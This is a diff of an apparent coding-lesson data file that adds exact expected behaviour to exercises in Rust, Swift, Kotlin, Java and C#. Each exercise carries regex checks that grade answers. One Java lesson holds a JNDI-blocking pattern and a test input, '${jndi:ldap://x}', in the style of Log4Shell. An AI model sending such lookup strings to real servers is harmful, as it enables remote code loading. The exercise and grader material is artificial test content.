+  task: `Write <code>fn sweep(hosts: Vec&lt;String&gt;) -&gt; usize</code> that spawns a thread per host with <code>thread::spawn(move || ...)</code>, increments a shared <code>Arc&lt;Mutex&lt;usize&gt;&gt;</code>, joins every handle and returns the final count. A host counts as reachable when its name isn't empty, so <code>sweep(vec!["a", "", "c"])</code> returns 2.`,
   starter: `use std::sync::{Arc, Mutex};\nuse std::thread;\n\n// your code here\n`,
   checks: [[/Arc::new\(\s*Mutex::new\(/, "Arc::new(Mutex::new(0))"], [/Arc::clone\(/, "Arc::clone(&counter)"], [/thread::spawn\(\s*move\s*\|\|/, "thread::spawn(move || ...)"], [/\.lock\(\)/, ".lock().unwrap()"], [/\.join\(\)/, "h.join().unwrap()"]] },
 
@@ -1913,7 +2160,7 @@ mod tests {
         write!(f, "{} total / {} fails", self.total, self.fails)
     }
 }</pre>`,
-  task: `Define <code>enum Status { Ok, Fail }</code>, <code>struct Record { ip: String, status: Status }</code>, <code>fn parse(line: &amp;str) -&gt; Result&lt;Record, String&gt;</code>, <code>struct Summary { total: usize, fails: usize }</code> with <code>impl std::fmt::Display for Summary</code>, <code>fn analyze(lines: &amp;[&amp;str]) -&gt; Summary</code> using <code>filter_map</code>, and a test module.`,
+  task: `Define <code>enum Status { Ok, Fail }</code>, <code>struct Record { ip: String, status: Status }</code>, <code>fn parse(line: &amp;str) -&gt; Result&lt;Record, String&gt;</code>, <code>struct Summary { total: usize, fails: usize }</code> with <code>impl std::fmt::Display for Summary</code>, <code>fn analyze(lines: &amp;[&amp;str]) -&gt; Summary</code> using <code>filter_map</code>, and a test module. <code>parse</code> accepts exactly two words, an IP and <code>OK</code> or <code>FAIL</code>, and returns <code>Err</code> for anything else. In the <code>Summary</code>, <code>total</code> counts lines that parsed and <code>fails</code> counts the <code>FAIL</code> ones, so <code>["1.1.1.1 FAIL", "2.2.2.2 OK", "junk", "3.3.3.3 FAIL"]</code> gives total 3, fails 2.`,
   starter: `// your code here\n`,
   checks: [[/enum\s+Status/, "enum Status { Ok, Fail }"], [/struct\s+Record/, "struct Record { ip, status }"], [/fn\s+parse\s*\(\s*line\s*:\s*&str\s*\)\s*->\s*Result<\s*Record\s*,\s*String\s*>/, "fn parse(line: &str) -> Result<Record, String>"], [/impl\s+(std::)?fmt::Display\s+for\s+Summary|impl\s+Display\s+for\s+Summary/, "impl std::fmt::Display for Summary"], [/filter_map/, ".filter_map(|l| parse(l).ok())"], [/#\[test\]/, "#[test]"]] }
 ]);
@@ -1947,7 +2194,7 @@ func open(_ code: String) -&gt; Bool {
     return true
 }
 for i in 1...3 { print(i) }</pre><p><code>switch</code> must be exhaustive, and there's no implicit fallthrough. <code>guard</code> keeps the happy path unindented.</p>`,
-  task: `Write <code>func threatLevel(_ score: Int) -&gt; String</code> using <code>switch</code> with range patterns and <code>default</code>, and <code>func validPin(_ pin: String) -&gt; Bool</code> that uses <code>guard</code>.`,
+  task: `Write <code>func threatLevel(_ score: Int) -&gt; String</code> using <code>switch</code> with range patterns and <code>default</code>, and <code>func validPin(_ pin: String) -&gt; Bool</code> that uses <code>guard</code>. Pass the <code>score</code> straight in. <code>validPin</code> returns <code>true</code> only for exactly 6 characters that are all digits, so <code>"123456"</code> passes and <code>"12345"</code>, <code>"12a456"</code> and <code>""</code> fail.`,
   starter: `// your code here\n`,
   checks: [[/func\s+threatLevel\s*\(\s*_\s+score\s*:\s*Int\s*\)\s*->\s*String/, "func threatLevel(_ score: Int) -> String"], [/switch\s+score/, "switch score { ... }"], [/case\s+\d+\s*(\.\.\.|\.\.<)\s*\d+/, "case 90...100:"], [/default\s*:/, "default:"], [/guard\s+.+\s+else\s*\{/, "guard condition else { return false }"]] },
 
@@ -1957,7 +2204,7 @@ if let ip = dossier["neo"] { print(ip) }
 guard let ip = dossier["trinity"] else { return }
 let fallback = dossier["morpheus"] ?? "unknown"
 let len = user?.profile?.bio?.count       // chaining</pre><p>Avoid force-unwrapping (<code>!</code>) unless a crash is truly impossible.</p>`,
-  task: `Write <code>func lookup(_ name: String, in db: [String: String]) -&gt; String</code> that uses <code>if let</code> or <code>guard let</code> and falls back with <code>??</code>. Don't use <code>!</code>.`,
+  task: `Write <code>func lookup(_ name: String, in db: [String: String]) -&gt; String</code> that uses <code>if let</code> or <code>guard let</code> and falls back with <code>??</code>. Don't use <code>!</code>. If the name isn't in <code>db</code>, return <code>db["default"]</code>, and if there's no default either, return <code>"unknown"</code>.`,
   starter: `// your code here\n`,
   checks: [[/func\s+lookup\s*\(\s*_\s+name\s*:\s*String\s*,\s*in\s+db\s*:\s*\[String\s*:\s*String\]\s*\)\s*->\s*String/, "func lookup(_ name: String, in db: [String: String]) -> String"], [/(if|guard)\s+let\s+\w+/, "if let / guard let"], [/\?\?/, "?? fallback"], [/^(?![\s\S]*\w!\s*[\.\)\s;])/, "no force unwrap (!)"]] },
 
@@ -1969,7 +2216,7 @@ for ip in ips { counts[ip, default: 0] += 1 }
 let doubled = [1, 2, 3].map { $0 * 2 }
 let big = [5, 50, 500].filter { $0 &gt; 10 }
 let total = [1, 2, 3].reduce(0, +)</pre><p>Collections are <b>value types</b>: assigning copies them (copy-on-write keeps that cheap).</p>`,
-  task: `Write <code>func tally(_ ips: [String]) -&gt; [String: Int]</code> using <code>counts[ip, default: 0] += 1</code>, and <code>func loud(_ ports: [Int]) -&gt; [Int]</code> using <code>filter</code> then <code>map</code>.`,
+  task: `Write <code>func tally(_ ips: [String]) -&gt; [String: Int]</code> using <code>counts[ip, default: 0] += 1</code>, and <code>func loud(_ ports: [Int]) -&gt; [Int]</code> using <code>filter</code> then <code>map</code>. <code>loud</code> keeps only ports above 1024 and multiplies each one by 10, so <code>loud([22, 8080, 443, 3000])</code> returns <code>[80800, 30000]</code>.`,
   starter: `// your code here\n`,
   checks: [[/func\s+tally\s*\(\s*_\s+ips\s*:\s*\[String\]\s*\)\s*->\s*\[String\s*:\s*Int\]/, "func tally(_ ips: [String]) -> [String: Int]"], [/default\s*:\s*0\s*\]\s*\+=\s*1/, "counts[ip, default: 0] += 1"], [/\.filter\s*\{/, ".filter { ... }"], [/\.map\s*\{/, ".map { ... }"]] },
 
@@ -1985,7 +2232,7 @@ retry(times: 3) { Bool.random() }        // trailing closure
 
 var handlers: [() -&gt; Void] = []
 func onAlert(_ h: @escaping () -&gt; Void) { handlers.append(h) }</pre><p>A closure that outlives the call must be <code>@escaping</code>. Inside classes, capture <code>[weak self]</code> to avoid retain cycles.</p>`,
-  task: `Write <code>func scan(host: String, port: Int = 443) -&gt; String</code>, a function <code>retry(times:_:)</code> taking a closure, call it with <b>trailing closure</b> syntax, and write <code>func onAlert(_ h: @escaping () -&gt; Void)</code> that stores the handler.`,
+  task: `Write <code>func scan(host: String, port: Int = 443) -&gt; String</code>, a function <code>retry(times:_:)</code> taking a closure, call it with <b>trailing closure</b> syntax, and write <code>func onAlert(_ h: @escaping () -&gt; Void)</code> that stores the handler. <code>scan</code> returns <code>"host:port"</code>, for example <code>"relay:443"</code>. <code>retry</code> calls the closure up to <code>times</code> times, returns <code>true</code> as soon as it returns <code>true</code>, and returns <code>false</code> if it never does. Declare <code>var handlers: [() -&gt; Void] = []</code> and have <code>onAlert</code> append to it.`,
   starter: `var handlers: [() -> Void] = []\n\n// your code here\n`,
   checks: [[/func\s+scan\s*\(\s*host\s*:\s*String\s*,\s*port\s*:\s*Int\s*=\s*443\s*\)/, "func scan(host: String, port: Int = 443)"], [/func\s+retry\s*\(\s*times\s*:\s*Int\s*,\s*_\s+\w+\s*:\s*\(\s*\)\s*->\s*Bool\s*\)/, "func retry(times: Int, _ op: () -> Bool)"], [/retry\s*\(\s*times\s*:\s*\d+\s*\)\s*\{/, "retry(times: 3) { ... }"], [/@escaping/, "@escaping"]] },
 
@@ -2001,7 +2248,7 @@ final class Session {         // reference type: shared
     init(id: String) { self.id = id }
     deinit { print("closed") }
 }</pre><p>Default to <code>struct</code>. Reach for <code>class</code> when you need shared identity, inheritance or <code>deinit</code>. SwiftUI is built on structs.</p>`,
-  task: `Define <code>struct Node</code> with <code>name</code>, <code>strength</code>, a computed <code>isHot: Bool</code> and a <code>mutating func boost(_ by: Int)</code>. Then define <code>final class Session</code> with <code>let id: String</code> and an <code>init</code>.`,
+  task: `Define <code>struct Node</code> with <code>name</code>, <code>strength</code>, a computed <code>isHot: Bool</code> and a <code>mutating func boost(_ by: Int)</code>. Then define <code>final class Session</code> with <code>let id: String</code> and an <code>init</code>. <code>strength</code> defaults to 0, <code>isHot</code> is <code>strength &gt; 80</code>, and <code>boost</code> adds to <code>strength</code>. <code>Session</code> has <code>init(id: String)</code>.`,
   starter: `// your code here\n`,
   checks: [[/struct\s+Node\s*\{/, "struct Node { ... }"], [/var\s+isHot\s*:\s*Bool\s*\{/, "var isHot: Bool { strength > 80 }"], [/mutating\s+func\s+boost/, "mutating func boost(_ by: Int)"], [/(final\s+)?class\s+Session/, "final class Session"], [/init\s*\(\s*id\s*:\s*String\s*\)/, "init(id: String)"]] },
 
@@ -2036,7 +2283,7 @@ func describe(_ e: Event) -&gt; String {
     }
 }
 enum Faction: String, CaseIterable { case logos, sentinel, meridian }</pre>`,
-  task: `Define <code>enum Event</code> with <code>login(user: String)</code>, <code>breach(severity: Int)</code> and <code>logout</code>, plus <code>func describe(_ e: Event) -&gt; String</code> with a <code>where</code> clause on one case. Add <code>enum Faction: String, CaseIterable</code>.`,
+  task: `Define <code>enum Event</code> with <code>login(user: String)</code>, <code>breach(severity: Int)</code> and <code>logout</code>, plus <code>func describe(_ e: Event) -&gt; String</code> with a <code>where</code> clause on one case. Add <code>enum Faction: String, CaseIterable</code>. Return text that mentions the user for <code>login</code> and the number for <code>breach</code> (like <code>"breach 3"</code>). Add a <code>where severity &gt;= 8</code> case that returns different words (like <code>"CRITICAL breach"</code>).`,
   starter: `// your code here\n`,
   checks: [[/enum\s+Event\s*\{/, "enum Event { ... }"], [/case\s+login\s*\(\s*user\s*:\s*String\s*\)/, "case login(user: String)"], [/case\s+\.breach\s*\(\s*let\s+\w+\s*\)\s*where/, "case .breach(let s) where s >= 8:"], [/enum\s+Faction\s*:\s*String\s*,\s*CaseIterable/, "enum Faction: String, CaseIterable"]] },
 
@@ -2051,7 +2298,7 @@ struct Keyword: Detector {
 }
 func strongest&lt;T: Comparable&gt;(_ xs: [T]) -&gt; T? { xs.max() }
 func merge&lt;C: Collection&gt;(_ c: C) -&gt; [C.Element] where C.Element: Hashable { Array(Set(c)) }</pre><p>Swift calls this protocol-oriented programming: compose behavior from protocols and extensions instead of deep class trees.</p>`,
-  task: `Define <code>protocol Detector</code>, an <code>extension Detector</code> with a default <code>count(in:)</code>, a <code>struct Keyword: Detector</code>, and a generic <code>func strongest&lt;T: Comparable&gt;(_ xs: [T]) -&gt; T?</code>.`,
+  task: `Define <code>protocol Detector</code>, an <code>extension Detector</code> with a default <code>count(in:)</code>, a <code>struct Keyword: Detector</code>, and a generic <code>func strongest&lt;T: Comparable&gt;(_ xs: [T]) -&gt; T?</code>. <code>Detector</code> requires <code>func detect(_ line: String) -&gt; Bool</code>. The extension's <code>count(in lines: [String]) -&gt; Int</code> counts matching lines. <code>Keyword</code> has <code>let word: String</code> and detects lines that contain it. <code>strongest</code> returns the largest value, or <code>nil</code> for an empty array.`,
   starter: `// your code here\n`,
   checks: [[/protocol\s+Detector/, "protocol Detector { ... }"], [/extension\s+Detector/, "extension Detector { ... }"], [/struct\s+Keyword\s*:\s*Detector/, "struct Keyword: Detector"], [/func\s+strongest\s*<\s*T\s*:\s*Comparable\s*>/, "func strongest<T: Comparable>(_ xs: [T]) -> T?"]] },
 
@@ -2072,7 +2319,7 @@ func sweep(_ hosts: [String]) async -&gt; Int {
         return up
     }
 }</pre><p>Swift 6 checks for data races at compile time. Swift 6.2's "approachable concurrency" can run code on the main actor by default, and you opt into parallelism with <code>@concurrent</code>.</p>`,
-  task: `Write <code>func ping(_ host: String) async -&gt; Bool</code>, an <code>actor Ledger</code> with a mutating method, and <code>func sweep(_ hosts: [String]) async -&gt; Int</code> using <code>withTaskGroup</code> and <code>for await</code>.`,
+  task: `Write <code>func ping(_ host: String) async -&gt; Bool</code>, an <code>actor Ledger</code> with a mutating method, and <code>func sweep(_ hosts: [String]) async -&gt; Int</code> using <code>withTaskGroup</code> and <code>for await</code>. <code>ping</code> returns <code>true</code> when the host name isn't empty. <code>Ledger</code> has <code>func record()</code> that adds 1 and <code>func total() -&gt; Int</code>. <code>sweep</code> returns how many hosts answered <code>true</code>.`,
   starter: `// your code here\n`,
   checks: [[/func\s+ping\s*\(\s*_\s+host\s*:\s*String\s*\)\s*async\s*->\s*Bool/, "func ping(_ host: String) async -> Bool"], [/actor\s+Ledger/, "actor Ledger { ... }"], [/withTaskGroup\s*\(/, "await withTaskGroup(of: Bool.self) { group in ... }"], [/group\.addTask/, "group.addTask { await ping(h) }"], [/for\s+await\s+/, "for await ok in group"]] },
 
@@ -2167,7 +2414,7 @@ fun String.isPrivateIp() = startsWith("10.") || startsWith("192.168.")
 val square: (Int) -&gt; Int = { it * it }
 fun retry(times: Int, op: () -&gt; Boolean): Boolean = (1..times).any { op() }
 retry(3) { Math.random() &gt; 0.5 }               // trailing lambda</pre>`,
-  task: `Write <code>fun scan(host: String, port: Int = 443)</code>, call it with a <b>named argument</b>, define the extension <code>fun String.isPrivateIp(): Boolean</code>, and write a higher-order function called with a trailing lambda.`,
+  task: `Write <code>fun scan(host: String, port: Int = 443)</code>, call it with a <b>named argument</b>, define the extension <code>fun String.isPrivateIp(): Boolean</code>, and write a higher-order function called with a trailing lambda. <code>scan</code> returns <code>"host:port"</code>. <code>isPrivateIp</code> is true for addresses that start with <code>10.</code>, <code>192.168.</code> or <code>172.16.</code>, and false for public ones like <code>8.8.8.8</code>.`,
   starter: `// your code here\n`,
   checks: [[/fun\s+scan\s*\(\s*host\s*:\s*String\s*,\s*port\s*:\s*Int\s*=\s*443/, "fun scan(host: String, port: Int = 443)"], [/scan\s*\([^)]*\w+\s*=\s*[^=]/, "named argument e.g. scan(\"core\", port = 22)"], [/fun\s+String\.isPrivateIp\s*\(\s*\)/, "fun String.isPrivateIp()"], [/\w+\s*\([^)]*\)\s*\{\s*[^}]*\}|\w+\s*\{\s*\w+\s*->/, "trailing lambda call"]] },
 
@@ -2181,7 +2428,7 @@ val parts = "user=neo;role=op".split(";").associate {
 }
 "  NeO ".trim().lowercase()
 "a1b2".filter { it.isDigit() }</pre><p>Null safety is part of the type system: a <code>String</code> can never be null. Avoid <code>!!</code>.</p>`,
-  task: `Write <code>fun lookup(name: String, db: Map&lt;String, String&gt;): String</code> using <code>?:</code> to return <code>"unknown"</code>, and <code>fun parseKv(s: String): Map&lt;String, String&gt;</code> using <code>split</code> and <code>associate</code>.`,
+  task: `Write <code>fun lookup(name: String, db: Map&lt;String, String&gt;): String</code> using <code>?:</code> to return <code>"unknown"</code>, and <code>fun parseKv(s: String): Map&lt;String, String&gt;</code> using <code>split</code> and <code>associate</code>. <code>parseKv("host=relay;port=22")</code> splits on <code>;</code>, then on <code>=</code>, and returns <code>mapOf("host" to "relay", "port" to "22")</code>.`,
   starter: `// your code here\n`,
   checks: [[/fun\s+lookup\s*\(\s*name\s*:\s*String\s*,\s*db\s*:\s*Map<String,\s*String>\s*\)\s*:\s*String/, "fun lookup(name: String, db: Map<String, String>): String"], [/\?:/, "Elvis ?: \"unknown\""], [/fun\s+parseKv/, "fun parseKv(s: String): Map<String, String>"], [/\.split\s*\(/, ".split(\";\")"], [/\.associate\s*\{/, ".associate { ... }"], [/^(?![\s\S]*!!)/, "no !!"]] },
 
@@ -2212,7 +2459,7 @@ fun parsePort(s: String): Int {
 val port = try { parsePort("x") } catch (e: BadPort) { -1 }   // try is an expression
 val r: Result&lt;Int&gt; = runCatching { parsePort("80") }
 r.onSuccess { println(it) }.onFailure { println(it.message) }</pre><p>Kotlin has no checked exceptions. Use <code>toIntOrNull</code>-style APIs for expected failures.</p>`,
-  task: `Define <code>class BadPort(...) : Exception(...)</code>, write <code>fun parsePort(s: String): Int</code> using <code>toIntOrNull()</code> and <code>require</code>, and handle errors once with try-as-expression and once with <code>runCatching</code>.`,
+  task: `Define <code>class BadPort(...) : Exception(...)</code>, write <code>fun parsePort(s: String): Int</code> using <code>toIntOrNull()</code> and <code>require</code>, and handle errors once with try-as-expression and once with <code>runCatching</code>. Valid ports are whole numbers from 1 to 65535. <code>"http"</code>, <code>"0"</code> and <code>"70000"</code> must all throw.`,
   starter: `// your code here\n`,
   checks: [[/class\s+BadPort\s*\([^)]*\)\s*:\s*(Exception|RuntimeException|IllegalArgumentException)\s*\(/, "class BadPort(raw: String) : Exception(...)"], [/toIntOrNull\(\)/, "s.toIntOrNull()"], [/require\s*\(/, "require(...)"], [/=\s*try\s*\{[\s\S]*catch/, "val x = try { ... } catch (e: BadPort) { ... }"], [/runCatching\s*\{/, "runCatching { ... }"]] },
 
@@ -2335,7 +2582,7 @@ String port = switch (service) {
 };
 for (int i = 0; i &lt; 5; i++) {}
 for (String h : hosts) {}</pre><p>Arrow-style <code>switch</code> has no fall-through and returns a value.</p>`,
-  task: `Write <code>static String threatLevel(int score)</code> using <code>if</code>/<code>else</code>, and <code>static int portFor(String service)</code> using a <b>switch expression</b> with <code>-&gt;</code> and <code>default</code>.`,
+  task: `Write <code>static String threatLevel(int score)</code> using <code>if</code>/<code>else</code>, and <code>static int portFor(String service)</code> using a <b>switch expression</b> with <code>-&gt;</code> and <code>default</code>. Use the thresholds 90, 60 and 30 for CRITICAL, HIGH, MEDIUM, and LOW otherwise. <code>portFor</code> maps <code>"ssh"</code> to 22, <code>"http"</code> to 80 and <code>"https"</code> to 443, and returns <code>-1</code> for anything else.`,
   starter: `public class Triage {\n    // your code here\n}\n`,
   checks: [[/static\s+String\s+threatLevel\s*\(\s*int\s+score\s*\)/, "static String threatLevel(int score)"], [/if\s*\(\s*score\s*>=?/, "if (score >= 90)"], [/static\s+int\s+portFor\s*\(\s*String\s+\w+\s*\)/, "static int portFor(String service)"], [/=\s*switch\s*\(|return\s+switch\s*\(/, "return switch (service) { ... }"], [/case\s+"[^"]+"\s*(,\s*"[^"]+"\s*)*->/, "case \"ssh\" -> 22;"], [/default\s*->/, "default -> ..."]] },
 
@@ -2354,7 +2601,7 @@ counts.getOrDefault("x", 0);</pre><p>Code to interfaces (<code>List</code>, <cod
   lesson: `<pre>static String scan(String host) { return scan(host, 443); }        // overload
 static String scan(String host, int port) { return host + ":" + port; }
 static int sum(int... xs) { int t = 0; for (int x : xs) t += x; return t; }   // varargs</pre><p>Java passes everything <b>by value</b>. For objects, the value is a reference, so methods can mutate an object but can't rebind the caller's variable. Java has no default arguments; use overloads instead.</p>`,
-  task: `Write two overloads, <code>scan(String host)</code> and <code>scan(String host, int port)</code>, where the first delegates to the second with 443. Add a varargs method <code>static int sum(int... xs)</code>.`,
+  task: `Write two overloads, <code>scan(String host)</code> and <code>scan(String host, int port)</code>, where the first delegates to the second with 443. Add a varargs method <code>static int sum(int... xs)</code>. <code>scan</code> returns <code>"host:port"</code>, for example <code>"relay:22"</code>. <code>sum()</code> with no arguments returns 0.`,
   starter: `public class Scanner {\n    // your code here\n}\n`,
   checks: [[/static\s+String\s+scan\s*\(\s*String\s+host\s*\)/, "static String scan(String host)"], [/static\s+String\s+scan\s*\(\s*String\s+host\s*,\s*int\s+port\s*\)/, "static String scan(String host, int port)"], [/return\s+scan\s*\(\s*host\s*,\s*443\s*\)/, "return scan(host, 443);"], [/int\s*\.\.\.\s*\w+/, "int... xs"]] },
 
@@ -2385,7 +2632,7 @@ public class Session {
     public int hits() { return hits; }
 }
 enum Faction { LOGOS, SENTINEL, MERIDIAN }</pre><p>Records generate the constructor, accessors, <code>equals</code>, <code>hashCode</code> and <code>toString</code>. Use them for data.</p>`,
-  task: `Define <code>record Node(String name, int strength)</code> with a compact constructor that validates input, a <code>class Session</code> with a <code>private final</code> field and a constructor, and an <code>enum</code>.`,
+  task: `Define <code>record Node(String name, int strength)</code> with a compact constructor that validates input, a <code>class Session</code> with a <code>private final</code> field and a constructor, and an <code>enum</code>. The compact constructor throws <code>IllegalArgumentException</code> when <code>name</code> is null or blank, or when <code>strength</code> is negative.`,
   starter: `// your code here\n`,
   checks: [[/record\s+Node\s*\(\s*String\s+name\s*,\s*int\s+strength\s*\)/, "record Node(String name, int strength)"], [/public\s+Node\s*\{|Node\s*\{\s*if/, "compact constructor: public Node { ... }"], [/class\s+Session/, "class Session"], [/private\s+final\s+\w+\s+\w+/, "private final String id;"], [/enum\s+\w+\s*\{/, "enum Faction { ... }"]] },
 
@@ -2443,7 +2690,7 @@ static double total(List&lt;? extends Number&gt; xs) { ... }    // PECS: produce
 Map&lt;String, Long&gt; byIp = lines.stream()
     .collect(Collectors.groupingBy(l -&gt; l.split(" ")[0], Collectors.counting()));
 int total = ports.stream().mapToInt(Integer::intValue).sum();</pre>`,
-  task: `Write <code>static List&lt;String&gt; failIps(List&lt;String&gt; lines)</code> using <code>.stream().filter(...).map(...)</code>, and <code>static Map&lt;String, Long&gt; byIp(List&lt;String&gt; lines)</code> using <code>Collectors.groupingBy</code> with <code>Collectors.counting()</code>.`,
+  task: `Write <code>static List&lt;String&gt; failIps(List&lt;String&gt; lines)</code> using <code>.stream().filter(...).map(...)</code>, and <code>static Map&lt;String, Long&gt; byIp(List&lt;String&gt; lines)</code> using <code>Collectors.groupingBy</code> with <code>Collectors.counting()</code>. Lines look like <code>"10.0.0.9 FAIL"</code>. <code>failIps</code> returns the IP of every FAIL line in order, repeats included. <code>byIp</code> counts every line per IP, whatever its status.`,
   starter: `import java.util.*;\nimport java.util.stream.*;\n\npublic class Streams {\n    // your code here\n}\n`,
   checks: [[/\.stream\(\)/, "lines.stream()"], [/\.filter\s*\(\s*\w+\s*->/, ".filter(l -> ...)"], [/\.map\s*\(\s*\w+\s*->/, ".map(l -> ...)"], [/Collectors\.groupingBy\s*\(/, "Collectors.groupingBy(...)"], [/Collectors\.counting\(\)/, "Collectors.counting()"]] },
 
@@ -2456,7 +2703,7 @@ CompletableFuture&lt;String&gt; cf = CompletableFuture.supplyAsync(() -&gt; fetc
     .thenApply(String::toUpperCase)
     .exceptionally(e -&gt; "offline");
 var seen = new ConcurrentHashMap&lt;String, Integer&gt;();</pre><p>Virtual threads let you write simple blocking code that scales to millions of concurrent tasks.</p>`,
-  task: `Write <code>static int sweep(List&lt;String&gt; hosts)</code> using <code>Executors.newVirtualThreadPerTaskExecutor()</code> in try-with-resources, an <code>AtomicInteger</code> counter, and one <code>CompletableFuture.supplyAsync</code> chain with <code>thenApply</code>.`,
+  task: `Write <code>static int sweep(List&lt;String&gt; hosts)</code> using <code>Executors.newVirtualThreadPerTaskExecutor()</code> in try-with-resources, an <code>AtomicInteger</code> counter, and one <code>CompletableFuture.supplyAsync</code> chain with <code>thenApply</code>. A host counts as reachable when its name isn't empty, so <code>sweep(List.of("a", "", "c"))</code> returns 2.`,
   starter: `import java.util.*;\nimport java.util.concurrent.*;\nimport java.util.concurrent.atomic.*;\n\npublic class Sweep {\n    // your code here\n}\n`,
   checks: [[/newVirtualThreadPerTaskExecutor\s*\(\s*\)/, "Executors.newVirtualThreadPerTaskExecutor()"], [/try\s*\(\s*var\s+\w+\s*=\s*Executors/, "try (var exec = Executors....)"], [/AtomicInteger/, "new AtomicInteger()"], [/CompletableFuture\.supplyAsync/, "CompletableFuture.supplyAsync(...)"], [/\.thenApply\s*\(/, ".thenApply(...)"]] },
 
@@ -2478,7 +2725,7 @@ static final Pattern JNDI = Pattern.compile("\\\\$\\\\{\\\\s*jndi:", Pattern.CAS
 static String sanitize(String in) { return JNDI.matcher(in).find() ? "[BLOCKED]" : in; }
 
 @Test void blocksJndi() { assertEquals("[BLOCKED]", sanitize("\${jndi:ldap://x}")); }</pre>`,
-  task: `Define a <code>sealed interface Event permits ...</code> with record implementations, an exhaustive <b>pattern-matching switch</b> that includes a <code>when</code> guard, a <code>sanitize</code> method that blocks <code>\${jndi:</code> using <code>Pattern</code>, and JUnit 5 <code>@Test</code> methods with <code>assertEquals</code>.`,
+  task: `Define a <code>sealed interface Event permits ...</code> with record implementations, an exhaustive <b>pattern-matching switch</b> that includes a <code>when</code> guard, a <code>sanitize</code> method that blocks <code>\${jndi:</code> using <code>Pattern</code>, and JUnit 5 <code>@Test</code> methods with <code>assertEquals</code>. Make it <code>static String sanitize(String input)</code>: return <code>"[BLOCKED]"</code> when the input contains <code>\${jndi:</code>, and return the input unchanged otherwise.`,
   starter: `import java.util.regex.*;\nimport static org.junit.jupiter.api.Assertions.*;\nimport org.junit.jupiter.api.Test;\n\n// your code here\n`,
   checks: [[/sealed\s+interface\s+Event\s+permits/, "sealed interface Event permits Login, Breach, Logout"], [/record\s+\w+\s*\([^)]*\)\s+implements\s+Event/, "record Login(String user) implements Event"], [/case\s+\w+\s+\w+\s+when\s+/, "case Breach b when b.severity() >= 8 ->"], [/Pattern\.compile\s*\(/, "Pattern.compile(...)"], [/jndi/i, "detect jndi"], [/@Test/, "@Test"], [/assertEquals\s*\(/, "assertEquals(...)"]] }
 ]);
@@ -2537,7 +2784,7 @@ static (int up, int down) Sweep(string[] hosts)        // tuple return
     return (Up(), 0);
 }
 var (up, down) = Sweep(["a", "b"]);</pre>`,
-  task: `Write <code>static string Scan(string host, int port = 443)</code> as an expression-bodied member, call it with a <b>named</b> argument, write <code>static bool TryParsePort(string s, out int port)</code>, and return a tuple from a method.`,
+  task: `Write <code>static string Scan(string host, int port = 443)</code> as an expression-bodied member, call it with a <b>named</b> argument, write <code>static bool TryParsePort(string s, out int port)</code>, and return a tuple from a method. <code>Scan</code> returns <code>"host:port"</code>. <code>TryParsePort</code> accepts whole numbers from 1 to 65535 and returns false for anything else. The tuple method is <code>static (int Up, int Down) Count(bool[] results)</code>, so <code>Count(new[] { true, false, true })</code> returns <code>(2, 1)</code>.`,
   starter: `// your code here\n`,
   checks: [[/static\s+string\s+Scan\s*\(\s*string\s+host\s*,\s*int\s+port\s*=\s*443\s*\)\s*=>/, "static string Scan(string host, int port = 443) => ..."], [/Scan\s*\([^)]*port\s*:/, "Scan(\"core\", port: 22)"], [/static\s+bool\s+TryParsePort\s*\(\s*string\s+s\s*,\s*out\s+int\s+port\s*\)/, "static bool TryParsePort(string s, out int port)"], [/static\s+\(\s*\w+\s+\w+\s*,\s*\w+\s+\w+\s*\)\s+\w+\s*\(/, "static (int up, int down) Sweep(...)"]] },
 
@@ -2570,7 +2817,7 @@ public class Session(string id)                       // primary constructor (C#
     public required string Owner { get; init; }
     public void Hit() =&gt; Hits++;
 }</pre>`,
-  task: `Define <code>record Node(string Name, int Strength = 0)</code> with a computed property, use a <code>with</code> expression, and define <code>class Session</code> with a <code>{ get; private set; }</code> property and a <code>required ... { get; init; }</code> property.`,
+  task: `Define <code>record Node(string Name, int Strength = 0)</code> with a computed property, use a <code>with</code> expression, and define <code>class Session</code> with a <code>{ get; private set; }</code> property and a <code>required ... { get; init; }</code> property. <code>IsHot</code> is <code>Strength &gt; 80</code>. Make <code>Session</code>'s <code>Id</code> a <code>required string Id { get; init; }</code>.`,
   starter: `// your code here\n`,
   checks: [[/record\s+Node\s*\(\s*string\s+Name/, "record Node(string Name, int Strength = 0)"], [/\bwith\s*\{/, "a with { Strength = 90 }"], [/class\s+Session/, "class Session"], [/\{\s*get;\s*private\s+set;\s*\}/, "{ get; private set; }"], [/required\s+\w+\s+\w+\s*\{\s*get;\s*init;\s*\}/, "required string Owner { get; init; }"]] },
 
@@ -2590,7 +2837,7 @@ finally { Console.WriteLine("done"); }
 using var reader = new StreamReader("auth.log");      // disposed at end of scope
 string? maybe = null;                                 // nullable reference type
 int len = maybe?.Length ?? 0;</pre>`,
-  task: `Define <code>class BadPortException : Exception</code>, write <code>static int ParsePort(string s)</code> that throws it, catch it with a <code>when</code> filter plus <code>finally</code>, and add a <code>using</code> declaration and a <code>?? </code> fallback.`,
+  task: `Define <code>class BadPortException : Exception</code>, write <code>static int ParsePort(string s)</code> that throws it, catch it with a <code>when</code> filter plus <code>finally</code>, and add a <code>using</code> declaration and a <code>?? </code> fallback. Valid ports are whole numbers from 1 to 65535. <code>ParsePort</code> throws <code>BadPortException</code> for <code>"http"</code> and for <code>"70000"</code>.`,
   starter: `// your code here\n`,
   checks: [[/class\s+BadPortException[^:]*:\s*Exception/, "class BadPortException : Exception"], [/throw\s+new\s+BadPortException/, "throw new BadPortException(s)"], [/catch\s*\(\s*BadPortException\s+\w+\s*\)\s*when\s*\(/, "catch (BadPortException e) when (...)"], [/finally\s*\{/, "finally { ... }"], [/using\s+(var|[\w<>]+)\s+\w+\s*=|using\s*\(/, "using var reader = ..."], [/\?\?/, "?? fallback"]] },
 
@@ -2638,7 +2885,7 @@ IEnumerable&lt;object&gt; objs = new List&lt;string&gt;();          // covarianc
 var byIp = lines.GroupBy(l =&gt; l.Split(' ')[0])
                 .ToDictionary(g =&gt; g.Key, g =&gt; g.Count());
 var q = from l in lines where l.Contains("FAIL") select l.ToUpper();   // query syntax</pre><p>LINQ is lazy: nothing runs until you enumerate the results or call <code>ToList()</code>. Entity Framework translates the same LINQ into SQL.</p>`,
-  task: `Write <code>static List&lt;string&gt; FailIps(IEnumerable&lt;string&gt; lines)</code> using <code>Where</code>, <code>Select</code> and <code>ToList</code>, and <code>ByIp</code> using <code>GroupBy</code> and <code>ToDictionary</code>.`,
